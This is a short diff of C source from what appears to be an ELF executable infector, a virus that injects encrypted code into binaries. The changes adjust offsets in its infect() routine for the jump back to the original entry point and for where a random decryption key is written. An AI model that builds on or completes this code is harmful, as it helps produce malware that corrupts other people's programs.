@@ -14,7 +14,7 @@
 
 static bool		parsing(byte *file, elf_data *data);
 
-#define _START_SIZE 0xd5
+#define _START_SIZE 0xb6
 
 uint32_t generate_random_key() {
     int64_t fd;
@@ -147,7 +147,7 @@ bool	infect(profiling *this, const str path) {
 
 	// Write jump to original entry point and jump to decrypt if we aren't the original
 	ft_memcpy(data.file + data.infection_offset_file + this->size - 16, (byte *)&new_jump, 4);
-	ft_memcpy(data.file + data.infection_offset_file + this->size - 197, (byte *)&zero, 4);
+	ft_memcpy(data.file + data.infection_offset_file + this->size - 159, (byte *)&zero, 4);
 
 	uint64_t key = generate_random_key();
 	if (key == 0) {
@@ -156,7 +156,7 @@ bool	infect(profiling *this, const str path) {
 	}
 
 	// Write the key
-	ft_memcpy(data.file + data.infection_offset_file + this->size - 177, (byte *)&key, 4);
+	ft_memcpy(data.file + data.infection_offset_file + this->size - 139, (byte *)&key, 4);
 
 	/* encrypt le code
 		debut = data.file + data.infection_offset_file
